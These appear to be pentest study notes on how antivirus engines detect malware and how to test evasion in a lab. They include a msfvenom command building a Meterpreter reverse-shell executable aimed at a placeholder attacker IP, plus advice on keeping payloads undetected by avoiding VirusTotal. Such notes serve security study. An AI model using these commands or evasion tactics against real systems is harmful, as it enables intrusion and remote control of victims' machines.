

Originally designed to remove viruses, AV's typically include firewalls, site scanners, etc.  

[https://cloudblogs.microsoft.com/microsoftsecure/2018/03/01/finfisher-exposed-a-researchers-tale-of-defeating-traps-tricks-and-complex-virtual-machines/](https://cloudblogs.microsoft.com/microsoftsecure/2018/03/01/finfisher-exposed-a-researchers-tale-of-defeating-traps-tricks-and-complex-virtual-machines/)  

# Modern AV Components

Designed around following components:
## File Engine
- Responsible for scheduled & real-time file scans.
	- Scheduled
		- Parses the entire file system and sends each file's metadata or data to signature engine
	- Real-time
		- Involves detecting & (possibly) reacting to any new file action
			- IE: Downloading new malware from a site.
		- Need to ID events at the kernel level via a *mini-filter driver*

## Memory Engine
- Inspects each process' memory space at runtime for well-known binary signatures or sus API calls (for memory injection attacks)

## Network Engine
- Inspects incoming and outgoing network traffic on the local nic
- Once signature is matched, might attempt to block the malware from comm'ing w/ its C2

## Disassembler
- Translates machine code into assembly, restructures the original program code section, and IDs any encoding/ decoding routine.
- Utilizes a sandbox or emulator for thorough analysis against any known signature

## Browser Plugin
- Browsers are protected by the sandbox, modern AVs often use browser plugins to get better visibility and detect malicious content that might be executed inside the browser.

## ML Engine
- Enables detection of unknown threats by relying on cloud-enhanced computing resources and algorithms



# Detection Methods
Since antivirus software vendors use different signatures and proprietary tech for detection,  
and each vendor updates their databases constantly, it's usually difficult to come up with a catch-all antivirus evasion solution.  
Quite often, this process is based on a trial-and-error approach in a test environment.  
  
So, ID the presence, type, & version of the deployed antivirus software before considering a bypass strategy.  
  
If the client network or system implements antivirus software, we should gather as much information as possible  
and replicate the configuration in a lab environment for AV bypass testing before uploading files to the target machine.  

## Signature-based
- Mostly considered a *restricted list technology*
	- Filesystem is scanned for KM signatures &, if detected, quarantines the file.
- Detects based on file hash or continuous sequence of bytes w/in the malware that uniquely ID's it.  
- Blocklisting  
	- Easy to bypass by changing/ obfuscating the contents
		- Ex: changing upper to lowercase completely changes the hash
  
## Heuristic-based
- Relies on various rules & algorithms to determine whether or not an action is considered malicious.  
- Steps through instruction set or attempts to de-compile & looks for malicious patterns/ program calls
- Doesn't rely on signatures so can detect Unknown or altered KM
  
## Behavior-based 
- Dynamically analyzes the behavior of the file.  
- Executes w/in an emulated env & looks for malicious actions  
- Doesn't rely on signatures so can detect Unknown or altered KM

## Machine Learning-based
- Uses ML algorithms to detect unknown threats by collecting and analyzing additional metadata
	- Ex: Microsoft Windows Defender has two ML components
		- Client ML engine
			- Responsible for creating ML models and heuristics
		- Cloud ML engine
			- Capable of analyzing the submitted sample against a metadata-based model comprised of all the submitted samples.
		- Whenever the client ML engine is unable to determine whether a program is benign or not, it will query the cloud ML counterpart for a final response.


# Malware Submission

Should be used as a last resort when we don't know the specifics of our target's AV vendor.
If we do know those specifics on the other hand, we should build a dedicated VM that resembles the customer environment as closely as possible

Another rule of thumb we should follow when developing AV bypasses is to always prefer custom code.
AV signatures are extrapolated from the malware sample and thus, the more novel and diversified our code is, the fewer chances we have to incur any existing detection.

## VirusTotal

Issue with VT is that once you upload your malware and it's analyzed, the signature is shared with all of the AV vendors so they can sandbox it and build their own detections for it, rendering it unusable


## AntiScan.Me

Scans our sample against 30 different AV engines and claims to not divulge any submitted sample to third-parties
- Only offers 4 scans a day
- Doesn't support *.ps1*


## Windows

Windows utilizes an _Automatic Sample Submission_ to its ML engine which can be disabled
	_Windows Security_ > _Virus & threat protection_ > _Manage Settings_ and deselecting the relative option


### Example & Test AV
- Create a Meterpreter payload:  
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<port> -f exe > binary.exe
```

- Upload to VirusTotal:  
	** Convenient but generates a hash for each unique submission, which is then shared with all participating AV vendors.  
	  As such, take care when submitting sensitive payloads as the hash is essentially considered public from the time of first submission.

![[virus-total-bad.png]]

- Use **nc** OR
```bash
python3 -m http.server 80
```
	to upload to Windows client  
  
- Install Avira on Win client:
```powershell
 C:\Tools\antivirus_evasion\
```

- Turn _Real_-_Time Protection_ on  
  
- Attempt to run _**binary.exe**_
	![[avira-alert.png]]

AV evasion falls into two broad categories: [on-disk](14.3.md) and [in-memory](14.3.1.md).
  
Given the maturity of AV file scanning, modern malware often attempts **in-memory** operation, avoiding the disk entirely and therefore reducing the possibility of being detected.  

